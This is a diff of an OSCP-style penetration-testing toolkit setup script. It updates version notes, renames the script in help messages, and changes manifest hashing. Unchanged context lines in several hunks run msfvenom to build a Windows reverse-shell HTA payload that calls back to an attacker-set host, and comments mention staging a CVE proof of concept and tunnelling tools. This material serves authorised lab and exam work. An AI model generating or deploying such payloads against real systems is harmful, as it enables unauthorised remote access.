@@ -7,10 +7,10 @@
 
 set -Eeuo pipefail
 
-# Updated 2026-07-08: chisel 1.11.5 -> 1.11.7, ligolo-ng 0.8.2 -> 0.8.3,
-# accesschk now pulled from the official signed Sysinternals zip, impacket no
-# longer force-installed via pip (uses apt/pipx to avoid Kali conflicts).
-# CopyFail (CVE-2026-31431) PoC hash re-verified and unchanged.
+# Updated 2026-10-07: chisel 1.12.0, ligolo-ng 0.9.2, safer archive extraction,
+# provenance ledger, pipx-first Python tooling, post-stage doctor, and corrected
+# CopyFail prerequisite-check exit status. accesschk/PsExec remain sourced from
+# official signed Sysinternals archives.
 CHISEL_VER="${CHISEL_VER:-1.12.0}"
 LIGOLO_VER="${LIGOLO_VER:-0.9.2}"
 SCRIPT_VERSION="7.0"
@@ -2663,7 +2663,7 @@ EOF
     msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f hta-psh -o webshells/rev.hta 2>/dev/null || warn "failed to generate rev.hta"
 else
     echo "[!] Skipping msfvenom payload generation."
-    echo "    Run later with: ./oscp-toolkit-setup-v6_4_bloodhound_docker.sh <KALI_IP> 443"
+    echo "    Run later with: ./oscp-toolkit-setup-v7.0.sh <KALI_IP> 443"
 fi
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
@@ -3531,7 +3531,7 @@ EOF
     msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f hta-psh -o webshells/rev.hta 2>/dev/null || warn "failed to generate rev.hta"
 else
     echo "[!] Skipping msfvenom payload generation."
-    echo "    Run later with: ./oscp-toolkit-setup-v6_4_bloodhound_docker.sh <KALI_IP> 443"
+    echo "    Run later with: ./oscp-toolkit-setup-v7.0.sh <KALI_IP> 443"
 fi
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
@@ -3540,7 +3540,7 @@ fi
 
 banner "VERIFYING OUTPUT"
 if have sha256sum; then
-    find "$TOOLKIT" -type f -not -path '*/MANIFEST.sha256' -exec sha256sum {} \; > "$TOOLKIT/MANIFEST.sha256" || true
+    find "$TOOLKIT" -type f -not -path '*/MANIFEST.sha256' -print0 | sort -z | xargs -0 -r sha256sum > "$TOOLKIT/MANIFEST.sha256" || true
     echo "[+] Wrote $TOOLKIT/MANIFEST.sha256"
 fi
 if have file; then
@@ -3548,7 +3548,7 @@ if have file; then
         echo "Skipped file-type scan in dry-run." > "$TOOLKIT/file-types.txt"
     else
         # Bound the file(1) scan so one malformed file cannot hang setup.
-        timeout 60s find "$TOOLKIT" -maxdepth 3 -type f -exec file {} \; > "$TOOLKIT/file-types.txt" || true
+        timeout 90s find "$TOOLKIT" -type f -exec file {} \; > "$TOOLKIT/file-types.txt" || true
     fi
     echo "[+] Wrote $TOOLKIT/file-types.txt"
 fi
@@ -4396,7 +4396,7 @@ EOF
     msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f hta-psh -o webshells/rev.hta 2>/dev/null || warn "failed to generate rev.hta"
 else
     echo "[!] Skipping msfvenom payload generation."
-    echo "    Run later with: ./oscp-toolkit-setup-v6_4_bloodhound_docker.sh <KALI_IP> 443"
+    echo "    Run later with: ./oscp-toolkit-setup-v7.0.sh <KALI_IP> 443"
 fi
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
@@ -5264,7 +5264,7 @@ EOF
     msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f hta-psh -o webshells/rev.hta 2>/dev/null || warn "failed to generate rev.hta"
 else
     echo "[!] Skipping msfvenom payload generation."
-    echo "    Run later with: ./oscp-toolkit-setup-v6_4_bloodhound_docker.sh <KALI_IP> 443"
+    echo "    Run later with: ./oscp-toolkit-setup-v7.0.sh <KALI_IP> 443"
 fi
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
